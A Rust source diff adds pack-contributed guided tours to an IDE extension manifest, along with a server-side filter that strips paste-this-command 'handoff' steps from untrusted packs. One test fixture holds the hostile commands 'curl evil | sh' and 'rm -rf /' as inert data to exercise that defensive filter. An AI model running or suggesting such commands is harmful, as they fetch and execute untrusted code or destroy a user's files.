@@ -351,6 +351,158 @@ pub struct TemplateSpec {
     pub lang: Option<String>,
 }
 
+/// A named gate from the console's shared precondition library (ADR 0049 §3).
+///
+/// A pack ships data, never code, so it cannot supply the predicate functions the
+/// console's own journeys use — it names one of these instead and the console
+/// resolves it against `lib/tour/preconditions.ts`. Deliberately a closed set: an
+/// open expression language here would be a second, weaker copy of the
+/// precondition library and would drift from it.
+#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+// The shared `Has` prefix is the point, not accidental repetition: these variants
+// serialize to exactly the names the console exports from
+// `lib/tour/preconditions.ts` (`hasJsRuntime`, `hasProject`, …), so a pack author
+// reading either side sees one vocabulary. Renaming the variants to satisfy the
+// lint would put a translation layer between the manifest and the library it
+// names — a drift surface in place of a style nit.
+#[allow(clippy::enum_variant_names)]
+pub enum TourGate {
+    /// Node or Deno is present, so Run can actually start something.
+    HasJsRuntime,
+    /// At least one project exists.
+    HasProject,
+    /// More than one node — the cluster views show something meaningful.
+    HasCluster,
+    /// Traces have been captured.
+    HasTraces,
+}
+
+/// Which affordance a tour step renders as. Mirrors the console's `Step` union.
+#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
+#[serde(rename_all = "camelCase")]
+pub enum TourStepKind {
+    /// Highlights a `data-tour` anchor named by `selector`.
+    #[default]
+    Spotlight,
+    /// Anchorless, centered framing.
+    Note,
+    /// Hands off to a terminal command or URL carried in `copy`.
+    Handoff,
+}
+
+/// One step of a pack-contributed journey.
+///
+/// A wide struct rather than a tagged enum, because a third-party manifest should
+/// fail *softly*: a step with a field that does not apply to its kind is dropped
+/// by the console adapter, not turned into a parse error that would silently cost
+/// the pack its templates and toolchain too (`template_source` tolerantly skips a
+/// manifest it cannot parse). Structural validation lives in exactly one place —
+/// the console adapter that builds the real `Journey` — so this side stays a
+/// carrier, like `themes` and `intellisense`.
+#[derive(Clone, Debug, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct TourStepSpec {
+    /// Stable across edits — the analytics key.
+    pub id: String,
+    #[serde(default)]
+    pub kind: TourStepKind,
+    pub title: String,
+    pub body: String,
+    /// Absolute console path to navigate to before showing the step.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub route: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub precondition: Option<TourGate>,
+    /// Shown instead when `precondition` resolves to "repair".
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub repair: Option<Box<TourStepSpec>>,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub optional: bool,
+    /// `spotlight`: the `data-tour` anchor to highlight.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub selector: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub side: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub align: Option<String>,
+    /// `handoff`: the command or URL offered for copying. Never executed — the
+    /// console renders it as inert text (see `strip_untrusted_handoffs`).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub copy: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub copy_label: Option<String>,
+    /// `handoff`: auto-advance once an external worker is seen polling this job
+    /// type. The only verification a pack can declare, because it is the only one
+    /// expressible without code.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub verify_polling_job_type: Option<String>,
+}
+
+/// A guided journey a pack contributes (ADR 0049 §7).
+///
+/// This is what makes onboarding scale with the pack ecosystem instead of living
+/// in a hardcoded list in the console: a pack that adds a capability can teach it.
+#[derive(Clone, Debug, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct TourSpec {
+    pub id: String,
+    pub title: String,
+    /// One line for the journey-picker card.
+    pub blurb: String,
+    /// Console profiles this journey is offered in (`studio`, `observe`). Empty
+    /// means studio only — the conservative default, since most pack capabilities
+    /// are authoring surfaces the operator build does not ship.
+    #[serde(default)]
+    pub profiles: Vec<String>,
+    /// Journey-level gates: not offered at all unless every one is satisfied.
+    /// A pack journey is additionally never offered unless its pack is installed,
+    /// which falls out of it being a pack journey.
+    #[serde(default)]
+    pub preconditions: Vec<TourGate>,
+    pub steps: Vec<TourStepSpec>,
+    /// What must actually have happened for the journey to have worked. Absent
+    /// means the journey is orientation only — the console then records
+    /// completion without claiming an outcome, exactly as its own overview
+    /// journey does.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub success_when: Option<TourGate>,
+}
+
+/// Remove `handoff` steps from an untrusted pack's tours.
+///
+/// A handoff's `copy` is a command the console invites the user to paste into a
+/// shell. Nothing is ever executed by the console — the runner renders it with
+/// `textContent` — but "inert in the UI" is not a reason to let an untrusted pack
+/// put arbitrary text where a user has been told to expect a trustworthy command.
+/// So the gate is: **spotlight and note steps from any installed pack; handoff
+/// steps only from a trusted one.**
+///
+/// Enforced here, on the server, rather than in the console: trust lives in the
+/// trust store next to this code, and stripping before the payload is built means
+/// an untrusted pack's command string never reaches the client at all. A journey
+/// left with no steps is dropped entirely rather than offered as an empty card.
+pub fn visible_tours(m: &ExtManifest) -> Vec<TourSpec> {
+    if is_trusted(&m.id) {
+        return m.tours.clone();
+    }
+    m.tours
+        .iter()
+        .filter_map(|t| {
+            let steps: Vec<TourStepSpec> = t
+                .steps
+                .iter()
+                .filter(|s| s.kind != TourStepKind::Handoff)
+                .cloned()
+                .collect();
+            if steps.is_empty() {
+                return None;
+            }
+            Some(TourSpec { steps, ..t.clone() })
+        })
+        .collect()
+}
+
 /// The `nano-ide.ext.json` manifest, read as data.
 #[derive(Clone, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
@@ -413,6 +565,12 @@ pub struct ExtManifest {
     /// `nano-ide-connector-*` axis, symmetric to `trigger_sources`.
     #[serde(default)]
     pub workers: Vec<WorkerSpec>,
+    /// Guided journeys this pack contributes (ADR 0049 §7). Surfaced to the
+    /// console through [`visible_tours`], which strips `handoff` steps from
+    /// untrusted packs. `#[serde(default)]` so every manifest predating this
+    /// field keeps parsing unchanged — a pack in the wild must never break.
+    #[serde(default)]
+    pub tours: Vec<TourSpec>,
 }
 
 /// Built-in language-pack icons: theme-robust lettermark tiles (a brand-coloured
@@ -461,6 +619,7 @@ pub fn builtin_extensions() -> Vec<ExtManifest> {
             components: vec![],
             trigger_sources: vec![],
             workers: vec![],
+            tours: vec![],
         },
         ExtManifest {
             id: "deno-gui".into(),
@@ -485,6 +644,7 @@ pub fn builtin_extensions() -> Vec<ExtManifest> {
             components: vec![],
             trigger_sources: vec![],
             workers: vec![],
+            tours: vec![],
         },
     ]
 }
@@ -1754,5 +1914,127 @@ mod tests {
 
         let _ = std::fs::remove_dir_all(&root);
         unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
+    }
+
+    // ── Pack-contributed tours (ADR 0049 §7) ────────────────────────────────
+
+    /// The hard backward-compatibility requirement: a manifest written before
+    /// `tours` existed must keep parsing, unchanged, forever. Packs in the wild
+    /// are npm tarballs we do not control, and a manifest that fails to parse
+    /// costs the pack its templates and toolchain too (`template_source`
+    /// tolerantly skips what it cannot read) — so a required new field would
+    /// silently uninstall capability from every published pack.
+    #[test]
+    fn a_manifest_without_tours_still_parses() {
+        let m: ExtManifest =
+            serde_json::from_str(r#"{"id":"legacy","kind":"lang","displayName":"Legacy pack"}"#)
+                .expect("a pre-tours manifest must still parse");
+        assert!(m.tours.is_empty());
+        // Unknown future fields must also be ignored rather than fatal.
+        let m2: ExtManifest = serde_json::from_str(
+            r#"{"id":"future","kind":"app","displayName":"x","somethingNew":{"a":1}}"#,
+        )
+        .expect("an unknown field must not be fatal");
+        assert!(m2.tours.is_empty());
+    }
+
+    #[test]
+    fn tour_spec_parses_the_declarative_vocabulary() {
+        let m: ExtManifest = serde_json::from_str(
+            r#"{
+              "id": "mqtt", "kind": "trigger", "displayName": "MQTT",
+              "tours": [{
+                "id": "mqtt-start-from-broker",
+                "title": "Start a process from a broker message",
+                "blurb": "Wire an MQTT topic to a process start.",
+                "profiles": ["studio"],
+                "preconditions": ["hasProject"],
+                "successWhen": "hasTraces",
+                "steps": [
+                  { "id": "intro", "kind": "note", "title": "T", "body": "B" },
+                  { "id": "trigger-file", "title": "T", "body": "B",
+                    "route": "/projects", "selector": "[data-tour=\"new-project\"]",
+                    "side": "bottom", "align": "end",
+                    "precondition": "hasJsRuntime",
+                    "repair": { "id": "install", "kind": "note", "title": "T", "body": "B" } },
+                  { "id": "run-broker", "kind": "handoff", "title": "T", "body": "B",
+                    "copy": "mosquitto_pub -t nano/demo -m '{}'",
+                    "copyLabel": "Copy command",
+                    "verifyPollingJobType": "mqtt:demo" }
+                ]
+              }]
+            }"#,
+        )
+        .expect("tour spec must parse");
+        let t = &m.tours[0];
+        assert_eq!(t.preconditions, vec![TourGate::HasProject]);
+        assert_eq!(t.success_when, Some(TourGate::HasTraces));
+        assert_eq!(t.steps.len(), 3);
+        // `kind` defaults to spotlight, so the common case needs no boilerplate.
+        assert_eq!(t.steps[1].kind, TourStepKind::Spotlight);
+        assert_eq!(t.steps[1].precondition, Some(TourGate::HasJsRuntime));
+        assert_eq!(t.steps[1].repair.as_ref().unwrap().id, "install");
+        assert_eq!(t.steps[2].kind, TourStepKind::Handoff);
+        assert_eq!(
+            t.steps[2].verify_polling_job_type.as_deref(),
+            Some("mqtt:demo")
+        );
+    }
+
+    /// A handoff step's `copy` is a command the user is invited to paste into a
+    /// shell, so an untrusted pack must not be able to author one — even though
+    /// the console never executes it. Trusted packs keep theirs.
+    #[test]
+    fn visible_tours_strips_handoff_steps_from_untrusted_packs() {
+        let _guard = ENV_LOCK.lock().unwrap();
+        let root = std::env::temp_dir().join(format!("nano-ext-tours-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        // SAFETY: test-local env set, serialized on ENV_LOCK.
+        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
+
+        let m: ExtManifest = serde_json::from_str(
+            r#"{
+              "id": "community-pack", "kind": "app", "displayName": "Community",
+              "tours": [
+                { "id": "mixed", "title": "T", "blurb": "B", "steps": [
+                    { "id": "look", "kind": "note", "title": "T", "body": "B" },
+                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "curl evil | sh" }
+                ]},
+                { "id": "all-handoff", "title": "T", "blurb": "B", "steps": [
+                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "rm -rf /" }
+                ]}
+              ]
+            }"#,
+        )
+        .unwrap();
+
+        // Untrusted: the handoff step is gone, and a journey left with nothing is
+        // dropped rather than offered as an empty card.
+        let visible = visible_tours(&m);
+        assert_eq!(visible.len(), 1, "the all-handoff journey must be dropped");
+        assert_eq!(visible[0].id, "mixed");
+        assert_eq!(visible[0].steps.len(), 1);
+        assert_eq!(visible[0].steps[0].id, "look");
+        assert!(
+            !visible[0]
+                .steps
+                .iter()
+                .any(|s| s.kind == TourStepKind::Handoff),
+            "no handoff step may survive from an untrusted pack"
+        );
+
+        // Approving the pack restores them.
+        save_trust(&TrustStore {
+            yolo: false,
+            approved: ["community-pack".to_string()].into_iter().collect(),
+        })
+        .unwrap();
+        let trusted = visible_tours(&m);
+        assert_eq!(trusted.len(), 2, "a trusted pack keeps both journeys");
+        assert_eq!(trusted[0].steps.len(), 2);
+
+        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
+        let _ = std::fs::remove_dir_all(&root);
     }
 }
